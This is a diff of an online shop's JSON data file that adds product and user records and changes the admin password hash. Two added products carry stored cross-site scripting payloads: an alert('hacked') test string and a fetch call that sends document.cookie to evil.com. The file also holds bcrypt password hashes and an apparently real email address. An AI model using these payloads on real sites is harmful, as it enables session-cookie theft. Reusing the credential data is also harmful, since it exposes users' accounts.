@@ -1223,6 +1223,54 @@
       "hidden": false,
       "date": 1782647756409,
       "bestseller": false
+    },
+    {
+      "_id": "cbb73",
+      "name": "INJECTED",
+      "description": "alert(\"hacked\")",
+      "price": 100,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782692766834,
+      "bestseller": false
+    },
+    {
+      "_id": "902a1",
+      "name": "fetch(\"https://evil.com/steal?cookie=\"+document.cookie)",
+      "description": "",
+      "price": 50,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782692789589,
+      "bestseller": false
     }
   ],
   "users": [
@@ -1230,7 +1278,7 @@
       "id": "1",
       "name": "Admin",
       "email": "admin",
-      "password": "$2a$10$KUFLmu6ow.M6H2jt4pc0duU/ju5R2CmzYfIRrUITr8YDQgNCTUfue",
+      "password": "$2a$10$hyzJHG8rPpFBfc/DtPOWwexpzxdbk/awAxFJVYgcRTbVN1g2QwzqW",
       "role": "admin"
     },
     {
@@ -1238,6 +1286,41 @@
       "name": "chie",
       "email": "chien180203@gmail.com",
       "password": "$2a$10$BpTYiyb/IKMLTts6gDJ0X.ce5biraAESLUuNagpYFNMWtRshfld3a",
+      "role": "user"
+    },
+    {
+      "id": "a1be2494-3430-493e-b04e-eb3e498edf80",
+      "name": "test",
+      "email": "t@t.com",
+      "password": "$2a$10$zaekQ5e70hhsl3G08LxfIOcWNQlCOmPZMFVPWilg6MW/y4217YTxe",
+      "role": "user"
+    },
+    {
+      "id": "0e6716ab-7e9a-4bcd-8205-1e0e98d4807e",
+      "name": "testuser",
+      "email": "test@test.com",
+      "password": "$2a$10$b0OFpItnBtHbbuRdcC0nI.UVwkTEsDD3L2vwLFq/.3h2FRgGn66Dy",
+      "role": "user"
+    },
+    {
+      "id": "b12de1af-63d4-4485-ba7c-24b7cbc1bfad",
+      "name": "testx",
+      "email": "testx@test.com",
+      "password": "$2a$10$91aC/ct8G6h3xGVEfEmW4O8kIN5KTXCtC3LJBYHu2l9XwTuHwU7Rm",
+      "role": "user"
+    },
+    {
+      "id": "18dfb0e5-2ea7-4175-aca7-597a6741d3a1",
+      "name": "testuser",
+      "email": "tes1t@test.com",
+      "password": "$2a$10$zGkXUvdDnNGxFokBFkVbY.OtTJ/hVjxjyWOe9.5QM6j4865FqHsvm",
+      "role": "user"
+    },
+    {
+      "id": "4b6e880d-3f40-4ea8-bbde-3675191e8600",
+      "name": "newuser",
+      "email": "newuser@test.com",
+      "password": "$2a$10$JjCGrKGf/2yYPbOzh.YME.hTn2Om.oZxa6zG67MskAFhrUxlteo/G",
       "role": "user"
     }
   ],
